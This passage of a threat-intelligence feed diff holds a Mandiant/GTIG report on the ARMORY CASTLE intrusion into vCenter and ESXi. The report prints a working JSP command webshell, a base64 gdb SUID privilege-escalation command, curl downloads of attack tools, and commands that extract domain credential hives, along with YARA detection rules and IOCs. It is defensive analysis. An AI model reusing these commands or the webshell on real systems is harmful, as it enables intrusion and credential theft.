which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. Establish a Foothold To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp , tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123 . if(\"123\".equals(request.getParameter(\"pwd\"))){ try{ ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\",\"-c\",request.getParameter(\"i\")); Process p = pb.start(); InputStream a = p.getInputStream(), b = p.getErrorStream(); int c; byte[] d = new byte[2048]; out.print(\"<pre>\"); while((c=a.read(d))!=-1){out.print(new String(d,0,c));} while((c=b.read(d))!=-1){out.print(new String(d,0,c));} out.print(\"</pre>\"); out.print(\"\\nEXIT:\"+p.waitFor()); }catch(Exception e){out.print(\"ERR:\"+e);} } Figure 3: SLIMSAVAGE Webshell By leveraging ProcessBuilder(\"/bin/sh\", \"-c\", ...) , the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output ( getInputStream() ) and standard error ( getErrorStream() ), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code ( \\nEXIT:<code> ). Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp , tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. File f = new File(\"/tmp\"); f.mkdirs(); File fout = new File(f, fname); try(FileOutputStream fos = new FileOutputStream(fout)){ fos.write(fd); } m = fout.getAbsolutePath(); Figure 4: CAGEMATCH File Staging Logic CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/<filename> , and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp , and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. Escalate Privileges To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env . ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env , any user would be allowed to execute commands as root. /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file /usr/bin/gdb -pid 113757 --command=/tmp/gdb_file Figure 5: ARMORY CASTLE gdb Privilege Escalation Move Laterally After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. curl -o /tmp/rar -k https://<REDACTED>/content/r.js Figure 6: ARMORY CASTLE downloads staged RAR utility ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. curl -o /tmp/123.rar -k https://<REDACTED>/content/r.js ./rar x -p<REDACTED> 123.rar Figure 7: ARMORY CASTLE extracts BONESAW Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local . BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir , forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. While CVE-2026-123890 shares some overlap with CVE-2026-59309 , primarily the obtaining of the shared session key \"K\" without knowing the password , there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords. Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/ . BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. Subcommand csa (\"Create SSO admin with minimal parameters\"): • Loads embedded default configuration template and parses CLI flags: • -h: Target vCenter address or vim25 SOAP endpoint (required). • -u: Username for the new SSO admin account (required). • -p: Password for the new SSO admin account (required). • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local). • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local). • -mdb-path: Path to an existing data.mdb file to skip remote database download. • -check-version: Probe target version and connectivity before executing the exploit chain. • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds). Figure 8: BONESAW Command Line Arguments When executed utilizing the CSA command line flag, BONESAW creates the following files on disk: <output_root>/temp/extracted_tenant_signer_<sanitized_host>/anon_<sanitized_host>_data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb) <output_root>/temp/extracted_tenant_signer_<sanitized_host>/<tenant>-tenantcredential-<N>.key.pem (Extracted RSA private key in PEM format) <output_root>/temp/extracted_tenant_signer_<sanitized_host>/<tenant>-tenantcredential-<N>.key.der (Extracted RSA private key in DER format) <output_root>/temp/extracted_tenant_signer_<sanitized_host>/<tenant>-tenantcredential-<N>.leaf.pem (Extracted leaf X.509 signing certificate) <output_root>/temp/extracted_tenant_signer_<sanitized_host>/<tenant>-tenantcredential-<N>.chain.pem (Extracted X.509 certificate chain) <output_root>/temp/extracted_tenant_signer_<sanitized_host>/<tenant>-tenantcredential-<N>.context.json (Target SSO and signer metadata) Figure 9: BONESAW Filesystem Artifacts Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py . SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments: -h, --help - show this help message and exit -p, --path PATH - Path to the data.mdb file (extract mode) -t, --target TARGET - The IP address of the target vCenter -k, --key KEY - IdP private key PEM file (direct-cert mode) -c, --cert CERTS - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks. --domain DOMAIN - SSO domain (default: parse from certificate subject DC=) --hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate) -e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit. -v, --verbose - Print extracted/loaded certificates Figure 10: SAWSNAKE Command Line Arguments SAWSNAKE creates the following files on disk: <export_dir>/idp_key.pem <export_dir>/trusted_cert_2.pem <export_dir>/domain.txt Figure 11: Files created by SAWSNAKE Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using rm . Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor /tmp/dbr tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from /tmp instead of the default directory /etc/dropbear . The authentication handler svr_auth_password for the packet type SSH_MSG_USERAUTH_REQUEST was backdoored to bypass /etc/shadow validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Additionally, the internal version string and the session identification string were modified to “ 23345 ” and “ SSH-2.0-pulsesecure_23345 ”. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing SSH-2.0-pulsesecure_23345 on non-standard high TCP ports. ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992. /tmp/dbr -R -p 53 /tmp/dbr -R -p 33992 Figure 12: BEARBONES Command Line Execution After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named sps-<REDACTED>@vsphere.local . Notably, ARMORY CASTLE enabled SSH on vCenter via the vCenter Server Appliance Management Interface (VAMI) API through a PUT request to /rest/appliance/access/ssh . Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. After enabling SSH, ARMORY CASTLE connected to the vCenter via SSH using the newly created local administrator account. ARMORY CASTLE then conducted credential theft, targeting the vCenter internal master crypto key file as well as the PostgreSQL password file using SSH. ARMORY CASTLE disabled the SSH service via the VAMI API immediately after extracting the vCenter master symmetric key and PostgreSQL database credentials. ARMORY CASTLE then was observed authenticating to ESXi Host Client (“ESXUI”) using the vpxuser account and also connected to it via SSH using the root account. Complete Mission ARMORY CASTLE used the WinSCP client to enumerate the ESXi file system, attached disks, mounted Virtual Machine File System (VMFS) volumes, and added an SSH public key to the root account’s authorized keys. ARMORY CASTLE conducted further reconnaissance and data theft on the ESXi filesystem using the root account. The actor was primarily observed enumerating directories and VMFS volumes. To stage and exfiltrate data from the ESXi filesystem, ARMORY CASTLE created a hidden directory, .a, on a VMFS volume to which they established an SCP connection to the ESXi using scp -r -d -t \"/vmfs/volumes/<volume>/.a \". ARMORY CASTLE then staged and extracted a suspected VMware specific toolset onto the ESXi host using tar xzf vmfs-pydist.tar.gz . python vmfs_browser.py -d \"/dev/disks/vml.<REDACTED>:1\" ls . python vmfs_browser.py -d \"/dev/disks/vml.<REDACTED>:1\" info \"<REDACTED>-flat.vmdk\" python vmfs_browser.py -d \"/dev/disks/vml.<REDACTED>:1\" ls \"<REDACTED>-flat.vmdk:part2\" python vmfs_browser.py -d \"/dev/disks/vml.<REDACTED>:1\" extract \"<REDACTED>-flat.vmdk:part4/Windows/NTDS\" ./NTDS python vmfs_browser.py -d \"/dev/disks/vml.<REDACTED>:1\" extract \"<REDACTED>-flat.vmdk:part4/Windows/System32/config/SYSTEM\" ./SYSTEM python vmfs_browser.py -d \"/dev/disks/vml.<REDACTED>:1\" extract \"<REDACTED>-flat.vmdk:part4/Windows/System32/config/SECURITY\" ./ python vmfs_browser.py -d \"/dev/disks/vml.<REDACTED>:1\" extract \"<REDACTED>-flat.vmdk:part4/Windows/System32/dns\" ./ Figure 13: ARMORY CASTLE reconnaissance of guest VMs ARMORY CASTLE then archived the extracted files into o.tar.gz , copied the archive from the ESXi filesystem using scp -r -p -d -f \"o.tar.gz\" , and deleted the hidden .a directory. On the Linux appliance, ARMORY CASTLE staged the corresponding OpenSSH RSA private key at /tmp/123.key (matching the public key added to ESXi root authorized_keys ) to authenticate outbound from the Linux appliance to ESXi over SSH without a password, alongside the BEARBONES SSH listener on the Linux appliance. From the Linux appliance, staged archives were downloaded via HTTP GET requests to the Remote Support appliance, from which ARMORY CASTLE likely exfiltrated the data. /usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -i /tmp/123.key -o BatchM [TRUNCATED@128] Figure 14: ARMORY CASTLE SSH Tunnel ARMORY CASTLE deployed a Slack-based backdoor tracked as LAZYBONES ( /usr/bin/vmtoolscs) to an additional Linux appliance alongside the /tmp/123.key SSH private key. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands ( cmd , upload , download , and sleep ) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. Attribution GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog , the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. Outlook and Implications While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and vmfs_browser.py , alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single compromise indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations. Remediation and Hardening The exploitation of CVE -2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities. For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide vSphere and BRICKSTORM Malware: A Defender's Guide . This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor. To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch . The Risks of Default Configurations: The VCSA Host-Based Firewall A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit: Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480). Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely. Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning. Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure. Proactive Hardening with the VCSA Hardening Tool To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool . This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via iptables. By transitioning the appliance to a strict \"Default Deny\" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor. The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits. VCSA Hardening Feature Impact on the ARMORY CASTLE Attack Chain Protection Against Future Zero-Days VCSA iptables Inbound DROP Policy & Connection Logging (Management Ports) The nmap scans targeting TCP ports 443, 5480, and 22 are silently dropped because the attacker's source IP is not in the trusted whitelists. These blocked connection attempts are instantly forwarded to the SIEM via the iptables-log-bridge.sh service, exposing the active network reconnaissance. Conceals critical management interfaces from internal network mapping tools and provides high-fidelity, early-warning alerts of active lateral movement before exploitation can occur. VCSA iptables Inbound DROP Policy (TCP 443) Even if BONESAW extracts the SAML key over port 2012, the attacker cannot utilize the SAWSNAKE-forged administrative cookies. The firewall drops all connections to the vSphere Web Client/API (TCP 443) from the compromised Linux appliance because it is not in the TRUSTED_WEB_IPS array. Provides defense-in-depth: Even if a zero-day allows credential theft or authentication bypass on a backend service, the stolen credentials/tokens cannot be used to access the management plane from an untrusted network. VCSA iptables Inbound DROP Policy (TCP 2010) An iptables DROP policy on TCP 2012 for non-allowlisted IPs prevents the exploit payload originating from a compromised Linux appliance from reaching the vmdird service. Drops unauthorized inbound connections to management interfaces and RPC services, mitigating network-level exploitation of vulnerable services. VCSA iptables Inbound DROP Policy (TCP 22 & 5480) Blocks the OS-level pivot. The firewall drops the PUT request to the VAMI API (TCP 5480 or 443) used to enable the SSH daemon. Furthermore, even if SSH was already enabled, the VCSA_SSH_RULES chain drops all SSH connections Protects the underlying OS and databases from direct credential theft or tampering. Even if an attacker gains administrative privileges within the web application, they are blocked from dropping down to a root shell. VCSA iptables Egress DROP Policy An egress DROP policy prevents SCP data exfiltration and blocks the LAZYBONES backdoor from establishing HTTPS C2 communications with external Slack endpoints. Blocks unauthorized outbound internet and internal network connections, preventing the VCSA from acting as a pivot point or establishing external C2. VCSA OS-Level Command and Syslog Auditing Remote syslog forwarding captures the execution of tar and Python vmfs_browser.py over SSH, exposing the extraction of NTDS.dit and registry hives in real-time. Forwards bash command execution and dropped network packets to a SIEM, bypassing local anti-forensics (e.g., .bash_history deletion) and alerting on unauthorized shell activity. VCSA Kernel-Level Rule Enforcement iptables rules operate independently of the VAMI application, preventing the actor from using the VAMI API (/rest/appliance/access/ssh) to circumvent network security controls. Decouples network security from the vCenter application layer, ensuring firewall policies cannot be modified via compromised VAMI or vSphere administrative credentials. Table 1: VCSA Hardening Features Note: When implementing iptables-based rules, we strongly advise rigorous testing and formal change control processes prior to production implementation. Indicators of Compromise (IOCs) To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users. Network Indicators Indicator Description 103.147.251.5 Suspected Obfuscation Network IP 103.190.38.3 Suspected Obfuscation Network IP 118.174.128.34 Suspected Obfuscation Network IP 118.174.128.36 Suspected Obfuscation Network IP 118.174.128.38 Suspected Obfuscation Network IP 176.9.89.66 Suspected Obfuscation Network IP 185.71.15.109 Suspected Obfuscation Network IP 220.121.128.41 Suspected Obfuscation Network IP 222.108.77.44 Suspected Obfuscation Network IP 61.216.56.127 Suspected Obfuscation Network IP 81.45.89.43 Suspected Obfuscation Network IP Table 2: Network Indicators File Indicators Filename Description ActiveSer.jsp SLIMSAVAGE Webshell u.jsp CAGEMATCH Staging Webshell /tmp/123 BONESAW Utility /tmp/sss SAWSNAKE Utility /tmp/dbr BEARBONES Backdoor /usr/bin/vmtoolscs LAZYBONES Backdoor Table 3: File Indicators Detections YARA Rules rule G_Hunting_Webshell_SLIMSAVAGE_1 { meta: author = \"Google Threat Intelligence Group\" strings: $s1 = \"if(\\\"123\\\".equals(request.getParameter(\\\"pwd\\\")))\" ascii wide $s2 = \"new ProcessBuilder(\\\"/bin/sh\\\",\\\"-c\\\",request.getParameter(\\\"i\\\"))\" ascii wide $s3 = \"InputStream a = p.getInputStream(), b = p.getErrorStream();\" ascii wide $s4 = \"while((c=a.read(d))!=-1){out.print(new String(d,0,c));}\" ascii wide $s5 = \"catch(Exception e){out.print(\\\"ERR:\\\"+e);}\" ascii wide condition: all of ($s*) } rule G_Hunting_Webshell_CAGEMATCH_1 { meta: author = \"Google Threat Intelligence Group\" strings: $s1 = \"request.getContentType().split(\\\"boundary=\\\")\" ascii wide $s2 = \"String s=new String(d,\\\"ISO-8859-1\\\");int fi=s.indexOf(\\\"filename=\\\\\\\"\\\");\" ascii wide $s3 = \"String fname=new File(s.substring(fs,fe)).getName();\" ascii wide $s4 = \"int so=s.substring(0,ds).getBytes(\\\"ISO-8859-1\\\").length;\" ascii wide $s5 = \"File f=new File(\\\"/tmp\\\");f.mkdirs();File fout=new File(f,fname);\" ascii wide condition: 4 of ($s*) } rule G_Hunting_Utility_SAWSNAKE_2 { meta: author = \"Google Threat Intelligence Group\" strings: $src1 = \"saml_login/mdb.go\" ascii $src2 = \"saml_login/saml.go\" ascii $src3 = \"saml_login/c14n.go\" ascii $s1 = \"[+] Successfully obtained Administrator cookies for %s!\" ascii $s2 = \"[*] Successfully extracted trusted certificate 1\" ascii $s3 = \"[*] Successfully extracted the IdP certificate\" ascii $s4 = \"https://%s/ui/saml/websso/sso\" ascii $s5 = \"effective SSO host for the exchange: %q\" ascii $s6 = \"assertion canonicalized for digest: %d bytes, sha256=%s\" ascii condition: uint32(0) == 0x464c457f and (2 of ($src*) or 4 of ($s*)) } rule G_Hunting_Utility_BONESAW_2 { meta: author = \"Google Threat Intelligence Group\" strings: $s_mdb_path = \"/storage/db/vmware-vmdir/data.mdb\" ascii $s_srp_prime_n = \"AC6BDB41324A9A9BF166DE5E1389582FAF72B6651987EE07FC3192943DB56050\" ascii $s_uuid_dbcp = \"72c780fe-af6b-42ba-9b02-f61f4ccc98ed\" ascii nocase $c_uuid_dbcp = { fe 80 c7 72 6b af ba 42 9b 02 f6 1f 4c cc 98 ed } $s_uuid_srp_verf = \"c7e94609-6ab0-4767-8e92-b6485bff1649\" ascii nocase $c_uuid_srp_verf = { 09 46 e9 c7 b0 6a 67 47 8e 92 b6 48 5b ff 16 49 } condition: uint32(0) == 0x464C457F and $s_mdb_path and $s_srp_prime_n and ($s_uuid_dbcp or $c_uuid_dbcp) and ($s_uuid_srp_verf or $c_uuid_srp_verf) } rule G_Hunting_Backdoor_BEARBONES_1 { meta: author = \"Google Threat Intelligence Group\" strings: $c_sha256_len = { BA 0E 00 00 00 4C 89 E7 48 89 EE } $s_banner = \"SSH-2.0-pulsesecure_\" ascii $s_rsa_key = \"/tmp/rsa_host_key\" ascii $s_ecdsa_key = \"/tmp/ecdsa_host_key\" ascii $s_dss_key = \"/tmp/dss_host_key\" ascii condition: uint32(0) == 0x464C457F and ($c_sha256_len or $s_banner) and 2 of ($s_*) } rule G_Hunting_Backdoor_LAZYBONES_1 { meta: author = \"Google Threat Intelligence Group\" strings: $fn1 = \"main.AesCtfCrypt_fromconf\" ascii wide $fn2 = \"main.AesCtfDecrypt_fromconf\" ascii wide $fn3 = \"main.uploadSlackFile\" ascii wide $fn4 = \"main.getLastMessage\" ascii wide $fn5 = \"main.exec_my\" ascii wide $api1 = \"https://slack.com/api/files.getUploadURLExternal\" ascii wide $api2 = \"https://slack.com/api/files.completeUploadExternal\" ascii wide $api3 = \"https://slack.com/api/conversations.history\" ascii wide $str1 = \"ok,current sleep is:\" ascii wide $str2 = \"get but not function\" ascii wide $str3 = \"readfile fail:\" ascii wide condition: uint32(0) == 0x464c457f and ( 3 of ($fn*) or (2 of ($api*) and 2 of ($str*)) ) } Google Security Operations (SecOps) Google SecOps customers have access to these broad category rules and more under the Mandiant Frontline Threats, Mandiant Intel Emerging Threats, and Mandiant Hunt Endpoint Identification Rules rule packs. The activity discussed in the blog post is detected in Google SecOps under the rule names: VMware vCenter VAMI API SSH Enablement Base64 Encoded Shell Command Execution Linux Web Server Process Echo Base64 Encoded String Suspicious Curl Network Connection to Staging Directory Suspicious Curl Download to tmp Acknowledgements This analysis would not have been possible without the assistance of Stuart Carrera and the FLARE team. We also appreciate Broadcom for their collaboration against this threat.",
-      "summary_excerpt": "Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05 . We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involvi",
-      "threat_actors": [],
-      "title": "ARMORY CASTLE Exploits vSphere"
-    },
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://www.darkreading.com/cybersecurity-operations/why-holiday-security-cant-wait-black-friday",
-      "cves": [],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-19T23:22:37.379709+09:00",
-      "heat_score": 45.0,
-      "permalink_id": "article-url-d6e8912274166c5d38428e2a",
-      "primary_category": "other",
-      "public_article_id": "url:d6e8912274166c5d38428e2a",
-      "public_tags": [],
-      "published_at": "2026-11-19T23:00:00+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "material",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "Dark Reading",
-      "summary": "Bot-driven fraud and holiday social engineering attacks stretch across many weeks, straining security teams and small businesses alike.",
-      "summary_excerpt": "Bot-driven fraud and holiday social engineering attacks stretch across many weeks, straining security teams and small businesses alike.",
-      "threat_actors": [],
-      "title": "Why Holiday Security Can't Wait for Black Friday"
     }
   ],
   "hottest": [
@@ -457,6 +467,46 @@
     },
     {
       "ai_relevance": "none",
+      "canonical_url": "https://www.zerodayinitiative.com/advisories/ZDI-26-1038/",
+      "cves": [
+        "CVE-2026-131813"
+      ],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-20T01:22:51.937494+09:00",
+      "heat_score": 67.5,
+      "permalink_id": "article-url-10e2990b0d978c39df0fec62",
+      "primary_category": "vulnerability",
+      "public_article_id": "url:10e2990b0d978c39df0fec62",
+      "public_tags": [
+        {
+          "color_family": "neutral",
+          "key": "vulnerability",
+          "label": "Vulnerability"
+        },
+        {
+          "color_family": "neutral",
+          "key": "ics",
+          "label": "ICS"
+        },
+        {
+          "color_family": "neutral",
+          "key": "cisa_ics_advisory",
+          "label": "ICS Advisory"
+        }
+      ],
+      "published_at": "2026-11-19T15:00:00+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "primary",
+      "seen_in_kev": false,
+      "source_class": "enrichment_rss",
+      "source_name": "Zero Day Initiative Published Advisories",
+      "summary": "This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of United Chargers Grizzl-E Smart 40A EV chargers. Authentication is not required to exploit this vulnerability. The ZDI has assigned a CVSS rating of 7.5. The following CVEs are assigned: CVE-2026-131813.",
+      "summary_excerpt": "This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of United Chargers Grizzl-E Smart 40A EV chargers. Authentication is not required to exploit this vulnerability. The ZDI has assigned a CVSS rating of 7.5. The following CVEs are assigned: CVE-2026-131813.",
+      "threat_actors": [],
+      "title": "ZDI-26-1038: (0Day) (Pwn2Own) United Chargers Grizzl-E Smart 40A OCPP UpdateFirmware Out-Of-Bounds Write Remote Code Execution Vulnerability"
+    },
+    {
+      "ai_relevance": "none",
       "canonical_url": "https://jvndb.jvn.jp/ja/contents/2026/JVNDB-2026-000175.html",
       "cves": [
         "CVE-2026-129517"
@@ -574,84 +624,10 @@
       "summary_excerpt": "On 18 November 2026, F5 published an advisory addressing five vulnerabilities in NGINX that allow an unauthenticated remote attacker to execute code with the privileges of the NGINX worker process. While researchers managed to successfully demonstrate the use of CVE-2026-123007, no exploitation in the wild has been reported yet. It is recommended to swiftly update NGINX as soon as possible, prioritising internet facing appliances.",
       "threat_actors": [],
       "title": "2026-022: Critical vulnerabilities in Nginx"
-    },
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://thehackernews.com/2026/11/critical-apache-roller-rce-flaw-under.html",
-      "cves": [
-        "CVE-2026-129448"
-      ],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-19T05:22:48.114708+09:00",
-      "heat_score": 67.5,
-      "permalink_id": "article-url-6ec0dce548ff06fef1684d29",
-      "primary_category": "vulnerability",
-      "public_article_id": "url:6ec0dce548ff06fef1684d29",
-      "public_tags": [
-        {
-          "color_family": "neutral",
-          "key": "vulnerability",
-          "label": "Vulnerability"
-        }
-      ],
-      "published_at": "2026-11-19T02:10:45+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "primary",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "The Hacker News",
-      "summary": "A critical security flaw in Apache Roller, an open-source, Java-based blogging platform, has come under active exploitation in the wild, according to the Apache Software Foundation (ASF) The vulnerability, tracked as CVE-2026-129448 (CVSS score: 9.8), is a case of unauthenticated deserialization in the XML-RPC endpoint that could lead to remote code execution. \"Deserialization of Untrusted",
